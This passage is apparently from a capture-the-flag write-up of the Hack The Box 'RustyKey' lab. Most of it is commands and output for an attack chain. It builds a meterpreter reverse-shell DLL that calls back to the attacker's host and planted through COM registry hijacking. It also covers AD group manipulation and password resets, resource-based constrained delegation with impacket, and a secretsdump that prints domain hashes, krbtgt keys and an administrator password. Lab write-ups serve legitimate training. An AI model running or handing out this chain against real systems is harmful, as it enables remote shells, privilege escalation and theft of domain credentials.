<p>the group support have full control</p>
<p>and we can know ee.reed is support user,so we should change its passwd by it-computer3$<br>and get a mal dll file to dll hijack<br>let&#96;s go</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msf</span></span><br><span class="line">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.8 LPORT=9002 -f dll -o wansh.dll                                             </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of dll file: 9216 bytes</span><br><span class="line">Saved as: wansh.dll</span><br><span class="line"></span><br><span class="line">$ msfconsole -q                                                                                                                               </span><br><span class="line">msf6 &gt; use multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 9002</span><br><span class="line">lport =&gt; 9002</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.8:9002 </span><br><span class="line"></span><br><span class="line"><span class="comment"># change ee.reed passwd</span></span><br><span class="line">╭─LDAP─[dc.rustykey.htb]─[RUSTYKEY\IT-Computer3$]-[NS:&lt;auto&gt;]</span><br><span class="line">╰─PV ❯ Add-DomainGroupMember -Identity HELPDESK -Members <span class="string">&#x27;IT-Computer3$&#x27;</span></span><br><span class="line">[2025-07-02 19:44:35] User IT-Computer3$ successfully added to HELPDESK</span><br><span class="line">╭─LDAP─[dc.rustykey.htb]─[RUSTYKEY\IT-Computer3$]-[NS:&lt;auto&gt;]</span><br><span class="line">╰─PV ❯ <span class="built_in">exit</span></span><br><span class="line"><span class="comment"># wansh @ Athena in ~/HackTheBox/RustyKey  [11:44:38]</span></span><br><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> powerview rustykey.htb/<span class="string">&#x27;IT-Computer3$&#x27;</span>:<span class="string">&#x27;Rusty88!&#x27;</span>@dc.rustykey.htb -k</span><br><span class="line">/home/wansh/.local/share/pipx/venvs/powerview/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources</span><br><span class="line">Logging directory is <span class="built_in">set</span> to /home/wansh/.powerview/logs/rustykey-it-computer3$-dc.rustykey.htb</span><br><span class="line">╭─LDAP─[dc.rustykey.htb]─[RUSTYKEY\IT-Computer3$]-[NS:&lt;auto&gt;]</span><br><span class="line">╰─PV ❯ Remove-DomainGroupMember -Identity <span class="string">&quot;Protected Objects&quot;</span> -Members SUPPORT</span><br><span class="line">[2025-07-02 19:44:54] User SUPPORT successfully removed from Protected Objects</span><br><span class="line">╭─LDAP─[dc.rustykey.htb]─[RUSTYKEY\IT-Computer3$]-[NS:&lt;auto&gt;]</span><br><span class="line">╰─PV ❯ Set-DomainUserPassword -Identity <span class="string">&quot;EE.REED&quot;</span> -AccountPassword mane1sgre@t  </span><br><span class="line">[2025-07-02 19:45:11] [Set-DomainUserPassword] Principal CN=ee.reed,OU=Users,OU=Support,DC=rustykey,DC=htb found <span class="keyword">in</span> domain</span><br><span class="line">[2025-07-02 19:45:14] [Set-DomainUserPassword] Password has been successfully changed <span class="keyword">for</span> user ee.reed</span><br><span class="line">[2025-07-02 19:45:14] Password changed <span class="keyword">for</span> EE.REED</span><br><span class="line"></span><br><span class="line"><span class="comment"># change reg dll path (ask gpt and it will give ypu answer)</span></span><br><span class="line">*Evil-WinRM* PS C:\wansh&gt; .\RunasCs.exe EE.REED <span class="string">&#x27;mane1sgre@t&#x27;</span> <span class="string">&#x27;reg add &quot;HKLM\Software\Classes\CLSID\&#123;23170F69-40C1-278A-1000-000100020000&#125;\InprocServer32&quot; /ve /d &quot;C:\wansh\wansh.dll&quot; /f&#x27;</span> -l 2</span><br><span class="line">[*] Warning: User profile directory <span class="keyword">for</span> user EE.REED does not exists. Use --force-profile <span class="keyword">if</span> you want to force the creation.</span><br><span class="line">[*] Warning: The logon <span class="keyword">for</span> user <span class="string">&#x27;EE.REED&#x27;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class="string">&#x27;8&#x27;</span> to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\wansh&gt; reg query <span class="string">&#x27;HKLM\Software\Classes\CLSID\&#123;23170F69-40C1-278A-1000-000100020000&#125;\InprocServer32&#x27;</span></span><br><span class="line">                                                                                                         </span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\CLSID\&#123;23170F69-40C1-278A-1000-000100020000&#125;\InprocServer32</span><br><span class="line">    (Default)    REG_SZ    C:\wansh\wansh.dll                                                                                                                                                                      </span><br><span class="line">    ThreadingModel    REG_SZ    Apartment                                                                </span><br><span class="line"><span class="comment"># revice shell</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.8:9002 </span><br><span class="line">[*] Sending stage (203846 bytes) to 10.129.165.216</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.16.8:9002 -&gt; 10.129.165.216:55616) at 2025-07-02 14:53:45 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>

<p>whoami</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">rustykey\mm.turner</span><br></pre></td></tr></table></figure>

<p>look at bloodhound<br>backupadmin is high right user<br><img src="/images/rustykey-9.png"></p>
<p>we can use RBCD attack </p>
<p>add it-computer3$ to dc</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uplaod PowerView.ps1</span></span><br><span class="line"><span class="built_in">PS</span> C:\wansh&gt; <span class="built_in">Set-ADComputer</span> <span class="literal">-Identity</span> DC <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> <span class="string">&quot;IT-COMPUTER3<span class="variable">$</span>&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\wansh&gt; <span class="built_in">Get-ADComputer</span> DC <span class="literal">-Properties</span> PrincipalsAllowedToDelegateToAccount</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb</span><br><span class="line">DNSHostName                          : dc.rustykey.htb</span><br><span class="line">Enabled                              : True</span><br><span class="line">Name                                 : DC</span><br><span class="line">ObjectClass                          : computer</span><br><span class="line">ObjectGUID                           : dee94947<span class="literal">-219e-4b13-9d41-543a4085431c</span></span><br><span class="line">PrincipalsAllowedToDelegateToAccount : &#123;CN=IT<span class="literal">-Computer3</span>,OU=Computers,OU=IT,DC=rustykey,DC=htb&#125;</span><br><span class="line">SamAccountName                       : DC<span class="variable">$</span></span><br><span class="line">SID                                  : S<span class="literal">-1-5-21-3316070415-896458127-4139322052-1000</span></span><br><span class="line">UserPrincipalName                    :</span><br><span class="line"></span><br><span class="line"><span class="variable">$</span> faketime <span class="operator">-f</span> <span class="string">&#x27;+28800s&#x27;</span> impacket<span class="literal">-getTGT</span> <span class="string">&#x27;rustykey.htb/IT-Computer3$:Rusty88!&#x27;</span></span><br><span class="line"><span class="variable">$</span> export KRB5CCNAME=IT<span class="literal">-Computer3</span>\<span class="variable">$</span>.ccache </span><br><span class="line"><span class="variable">$</span> faketime <span class="operator">-f</span> <span class="string">&#x27;+28800s&#x27;</span> impacket<span class="literal">-getST</span> <span class="string">&#x27;RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!&#x27;</span> <span class="literal">-k</span>  <span class="literal">-spn</span> <span class="string">&#x27;cifs/DC.rustykey.htb&#x27;</span> <span class="literal">-impersonate</span> backupadmin <span class="literal">-dc-ip</span> <span class="variable">$IP</span>  </span><br><span class="line">Impacket v0.<span class="number">12.0</span> - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Impersonating backupadmin</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache</span><br><span class="line"></span><br><span class="line"><span class="variable">$</span> export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache</span><br></pre></td></tr></table></figure>

<p>we can try dump hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&#x27;+8h&#x27;</span> impacket-secretsdump -k -no-pass RUSTYKEY.HTB/backupadmin@dc.rustykey.htb -dc-ip <span class="variable">$IP</span></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping cached domain logon information (domain/username:hash)</span></span><br><span class="line"><span class="string">[*] Dumping LSA Secrets</span></span><br><span class="line"><span class="string">[*] $MACHINE.ACC</span></span><br><span class="line"><span class="string">RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25</span></span><br><span class="line"><span class="string">RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::</span></span><br><span class="line"><span class="string">[*] DefaultPassword</span></span><br><span class="line"><span class="string">RUSTYKEY\Administrator:Rustyrc4key#!</span></span><br><span class="line"><span class="string">[*] DPAPI_SYSTEM</span></span><br><span class="line"><span class="string">dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397</span></span><br><span class="line"><span class="string">dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c</span></span><br><span class="line"><span class="string">[*] NL$KM</span></span><br><span class="line"><span class="string"> 0000   6A 34 14 2E FC 1A C2 54  64 E3 4C F1 A7 13 5F 34   j4.....Td.L..._4</span></span><br><span class="line"><span class="string"> 0010   79 98 16 81 90 47 A1 F0  8B FC 47 78 8C 7B 76 B6   y....G....Gx.&#123;v.</span></span><br><span class="line"><span class="string"> 0020   C0 E4 94 9D 1E 15 A6 A9  70 2C 13 66 D7 23 A1 0B   ........p,.f.#..</span></span><br><span class="line"><span class="string"> 0030   F1 11 79 34 C1 8F 00 15  7B DF 6F C7 C3 B4 FC FE   ..y4....&#123;.o.....</span></span><br><span class="line"><span class="string">NL$KM:6a34142efc1ac25464e34cf1a7135f34799816819047a1f08bfc47788c7b76b6c0e4949d1e15a6a9702c1366d723a10bf1117934c18f00157bdf6fc7c3b4fcfe</span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span><br><span class="line"><span class="string">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26:::</span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3:::</span></span><br><span class="line"><span class="string">rustykey.htb\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787:::</span></span><br><span class="line"><span class="string">rustykey.htb\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca:::</span></span><br><span class="line"><span class="string">rustykey.htb\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:44c72edbf1d64dc2ec4d6d8bc24160fc:::</span></span><br><span class="line"><span class="string">rustykey.htb\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41:::</span></span><br><span class="line"><span class="string">rustykey.htb\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e:::</span></span><br><span class="line"><span class="string">rustykey.htb\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:4dee0d4ff7717c630559e3c3c3025bbf:::</span></span><br><span class="line"><span class="string">rustykey.htb\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa:::</span></span><br><span class="line"><span class="string">rustykey.htb\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451:::</span></span><br><span class="line"><span class="string">DC$:1000:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::</span></span><br><span class="line"><span class="string">Support-Computer1$:1103:aad3b435b51404eeaad3b435b51404ee:5014a29553f70626eb1d1d3bff3b79e2:::</span></span><br><span class="line"><span class="string">Support-Computer2$:1104:aad3b435b51404eeaad3b435b51404ee:613ce90991aaeb5187ea198c629bbf32:::</span></span><br><span class="line"><span class="string">Support-Computer3$:1105:aad3b435b51404eeaad3b435b51404ee:43c00d56ff9545109c016bbfcbd32bee:::</span></span><br><span class="line"><span class="string">Support-Computer4$:1106:aad3b435b51404eeaad3b435b51404ee:c52b0a68cb4e24e088164e2e5cf2b98a:::</span></span><br><span class="line"><span class="string">Support-Computer5$:1107:aad3b435b51404eeaad3b435b51404ee:2f312c564ecde3769f981c5d5b32790a:::</span></span><br><span class="line"><span class="string">Finance-Computer1$:1118:aad3b435b51404eeaad3b435b51404ee:d6a32714fa6c8b5e3ec89d4002adb495:::</span></span><br><span class="line"><span class="string">Finance-Computer2$:1119:aad3b435b51404eeaad3b435b51404ee:49c0d9e13319c1cb199bc274ee14b04c:::</span></span><br><span class="line"><span class="string">Finance-Computer3$:1120:aad3b435b51404eeaad3b435b51404ee:65f129254bea10ac4be71e453f6cabca:::</span></span><br><span class="line"><span class="string">Finance-Computer4$:1121:aad3b435b51404eeaad3b435b51404ee:ace1db31d6aeb97059bf3efb410df72f:::</span></span><br><span class="line"><span class="string">Finance-Computer5$:1122:aad3b435b51404eeaad3b435b51404ee:b53f4333805f80406b4513e60ef83457:::</span></span><br><span class="line"><span class="string">IT-Computer1$:1123:aad3b435b51404eeaad3b435b51404ee:fe60afe8d9826130f0e06cd2958a8a61:::</span></span><br><span class="line"><span class="string">IT-Computer2$:1124:aad3b435b51404eeaad3b435b51404ee:73d844e19c8df244c812d4be1ebcff80:::</span></span><br><span class="line"><span class="string">IT-Computer3$:1125:aad3b435b51404eeaad3b435b51404ee:b52b582f02f8c0cd6320cd5eab36d9c6:::</span></span><br><span class="line"><span class="string">IT-Computer4$:1126:aad3b435b51404eeaad3b435b51404ee:763f9ea340ccd5571c1ffabf88cac686:::</span></span><br><span class="line"><span class="string">IT-Computer5$:1127:aad3b435b51404eeaad3b435b51404ee:1679431d1c52638688b4f1321da14045:::</span></span><br><span class="line"><span class="string">[*] Kerberos keys grabbed</span></span><br><span class="line"><span class="string">Administrator:des-cbc-md5:e007705d897310cd</span></span><br><span class="line"><span class="string">krbtgt:aes256-cts-hmac-sha1-96:ee3271eb3f7047d423c8eeaf1bd84f4593f1f03ac999a3d7f3490921953d542a</span></span><br><span class="line"><span class="string">krbtgt:aes128-cts-hmac-sha1-96:24465a36c2086d6d85df701553a428af</span></span><br><span class="line"><span class="string">krbtgt:des-cbc-md5:d6d062fd1fd32a64</span></span><br><span class="line"><span class="string">rustykey.htb\rr.parker:des-cbc-md5:8c5b3b54b9688aa1</span></span><br><span class="line"><span class="string">rustykey.htb\mm.turner:aes256-cts-hmac-sha1-96:707ba49ed61c6575bfe9a3fd1541fc008e8803bfb0d7b5d21122cc464f39cbb9</span></span><br><span class="line"><span class="string">rustykey.htb\mm.turner:aes128-cts-hmac-sha1-96:a252d2716a0b365649eaec02f84f12c8</span></span><br><span class="line"><span class="string">rustykey.htb\mm.turner:des-cbc-md5:a46ea77c13854945</span></span><br><span class="line"><span class="string">rustykey.htb\bb.morgan:des-cbc-md5:d6ef5e57a2abb93b</span></span><br><span class="line"><span class="string">rustykey.htb\gg.anderson:des-cbc-md5:8923850da84f2c0d</span></span><br><span class="line"><span class="string">rustykey.htb\dd.ali:des-cbc-md5:613da45e3bef34a7</span></span><br><span class="line"><span class="string">rustykey.htb\ee.reed:des-cbc-md5:2fc46d9b898a4a29</span></span><br><span class="line"><span class="string">rustykey.htb\nn.marcos:aes256-cts-hmac-sha1-96:53ee5251000622bf04e80b5a85a429107f8284d9fe1ff5560a20ec8626310ee8</span></span><br><span class="line"><span class="string">rustykey.htb\nn.marcos:aes128-cts-hmac-sha1-96:cf00314169cb7fea67cfe8e0f7925a43</span></span><br><span class="line"><span class="string">rustykey.htb\nn.marcos:des-cbc-md5:e358835b1c238661</span></span><br><span class="line"><span class="string">rustykey.htb\backupadmin:des-cbc-md5:625e25fe70a77358</span></span><br><span class="line"><span class="string">DC$:des-cbc-md5:915d9d52a762675d</span></span><br><span class="line"><span class="string">Support-Computer1$:aes256-cts-hmac-sha1-96:89a52d7918588ddbdae5c4f053bbc180a41ed703a30c15c5d85d123457eba5fc</span></span><br><span class="line"><span class="string">Support-Computer1$:aes128-cts-hmac-sha1-96:3a6188fdb03682184ff0d792a81dd203</span></span><br><span class="line"><span class="string">Support-Computer1$:des-cbc-md5:c7cb8a76c76dfed9</span></span><br><span class="line"><span class="string">Support-Computer2$:aes256-cts-hmac-sha1-96:50f8a3378f1d75df813db9d37099361a92e2f2fb8fcc0fc231fdd2856a005828</span></span><br><span class="line"><span class="string">Support-Computer2$:aes128-cts-hmac-sha1-96:5c3fa5c32427fc819b10f9b9ea4be616</span></span><br><span class="line"><span class="string">Support-Computer2$:des-cbc-md5:a2a202ec91e50b6d</span></span><br><span class="line"><span class="string">Support-Computer3$:aes256-cts-hmac-sha1-96:e3b7b8876ac617dc7d2ba6cd2bea8de74db7acab2897525dfd284c43c8427954</span></span><br><span class="line"><span class="string">Support-Computer3$:aes128-cts-hmac-sha1-96:1ea036e381f3279293489c19cfdeb6c1</span></span><br><span class="line"><span class="string">Support-Computer3$:des-cbc-md5:c13edcfe4676f86d</span></span><br><span class="line"><span class="string">Support-Computer4$:aes256-cts-hmac-sha1-96:1708c6a424ed59dedc60e980c8f2ab88f6e2bb1bfe92ec6971c8cf5a40e22c1e</span></span><br><span class="line"><span class="string">Support-Computer4$:aes128-cts-hmac-sha1-96:9b6d33ef93c69721631b487dc00d3047</span></span><br><span class="line"><span class="string">Support-Computer4$:des-cbc-md5:3b79647680e0d57a</span></span><br><span class="line"><span class="string">Support-Computer5$:aes256-cts-hmac-sha1-96:464551486df4086accee00d3d37b60de581ee7adad2a6a31e3730fad3dfaed42</span></span><br><span class="line"><span class="string">Support-Computer5$:aes128-cts-hmac-sha1-96:1ec0c93b7f9df69ff470e2e05ff4ba89</span></span><br><span class="line"><span class="string">Support-Computer5$:des-cbc-md5:73abb53162d51fb3</span></span><br><span class="line"><span class="string">Finance-Computer1$:aes256-cts-hmac-sha1-96:a57ce3a3e4ee34bc08c8538789fa6f99f5e8fb200a5f77741c5bf61b3d899918</span></span><br><span class="line"><span class="string">Finance-Computer1$:aes128-cts-hmac-sha1-96:e62b7b772aba6668af65e9d1422e6aea</span></span><br><span class="line"><span class="string">Finance-Computer1$:des-cbc-md5:d9914cf29e76f8df</span></span><br><span class="line"><span class="string">Finance-Computer2$:aes256-cts-hmac-sha1-96:4d45b576dbd0eab6f4cc9dc75ff72bffe7fae7a2f9dc50b5418e71e8dc710703</span></span><br><span class="line"><span class="string">Finance-Computer2$:aes128-cts-hmac-sha1-96:3fd0dd200120ca90b43af4ab4e344a78</span></span><br><span class="line"><span class="string">Finance-Computer2$:des-cbc-md5:23ef512fb3a8d37c</span></span><br><span class="line"><span class="string">Finance-Computer3$:aes256-cts-hmac-sha1-96:1b2280d711765eb64bdb5ab1f6b7a3134bc334a3661b3335f78dd590dee18b0d</span></span><br><span class="line"><span class="string">Finance-Computer3$:aes128-cts-hmac-sha1-96:a25859c88f388ae7134b54ead8df7466</span></span><br><span class="line"><span class="string">Finance-Computer3$:des-cbc-md5:2a688a43ab40ecba</span></span><br><span class="line"><span class="string">Finance-Computer4$:aes256-cts-hmac-sha1-96:291adb0905f3e242748edd1c0ecaab34ca54675594b29356b90da62cf417496f</span></span><br><span class="line"><span class="string">Finance-Computer4$:aes128-cts-hmac-sha1-96:81fed1f0eeada2f995ce05bbf7f8f951</span></span><br><span class="line"><span class="string">Finance-Computer4$:des-cbc-md5:6b7532c83bc84c49</span></span><br><span class="line"><span class="string">Finance-Computer5$:aes256-cts-hmac-sha1-96:6171c0240ae0ce313ecbd8ba946860c67903b12b77953e0ee38005744507e3de</span></span><br><span class="line"><span class="string">Finance-Computer5$:aes128-cts-hmac-sha1-96:8e6aa26b24cdda2d7b5474b9a3dc94dc</span></span><br><span class="line"><span class="string">Finance-Computer5$:des-cbc-md5:92a72f7f865bb6cd</span></span><br><span class="line"><span class="string">IT-Computer1$:aes256-cts-hmac-sha1-96:61028ace6c840a6394517382823d6485583723f9c1f98097727ad3549d833b1e</span></span><br><span class="line"><span class="string">IT-Computer1$:aes128-cts-hmac-sha1-96:7d1a98937cb221fee8fcf22f1a16b676</span></span><br><span class="line"><span class="string">IT-Computer1$:des-cbc-md5:019d29370ece8002</span></span><br><span class="line"><span class="string">IT-Computer2$:aes256-cts-hmac-sha1-96:e9472fb1cf77df86327e5775223cf3d152e97eebd569669a6b22280316cf86fa</span></span><br><span class="line"><span class="string">IT-Computer2$:aes128-cts-hmac-sha1-96:a80fba15d78f66477f0591410a4ffda7</span></span><br><span class="line"><span class="string">IT-Computer2$:des-cbc-md5:622f2ae961abe932</span></span><br><span class="line"><span class="string">IT-Computer3$:aes256-cts-hmac-sha1-96:7871b89896813d9e4a732a35706fe44f26650c3da47e8db4f18b21cfbb7fbecb</span></span><br><span class="line"><span class="string">IT-Computer3$:aes128-cts-hmac-sha1-96:0e14a9e6fd52ab14e36703c1a4c542e3</span></span><br><span class="line"><span class="string">IT-Computer3$:des-cbc-md5:f7025180cd23e5f1</span></span><br><span class="line"><span class="string">IT-Computer4$:aes256-cts-hmac-sha1-96:68f2e30ca6b60ec1ab75fab763087b8772485ee19a59996a27af41a498c57bbc</span></span><br><span class="line"><span class="string">IT-Computer4$:aes128-cts-hmac-sha1-96:181ffb2653f2dc5974f2de924f0ac24a</span></span><br><span class="line"><span class="string">IT-Computer4$:des-cbc-md5:bf58cb437340cd3d</span></span><br><span class="line"><span class="string">IT-Computer5$:aes256-cts-hmac-sha1-96:417a87cdc95cb77997de6cdf07d8c9340626c7f1fbd6efabed86607e4cfd21b8</span></span><br><span class="line"><span class="string">IT-Computer5$:aes128-cts-hmac-sha1-96:873fd89f24e79dcd0affe6f63c51ec9a</span></span><br><span class="line"><span class="string">IT-Computer5$:des-cbc-md5:ad5eec6bcd4f86f7</span></span><br></pre></td></tr></table></figure>

<p>then we can pass the hash</p>
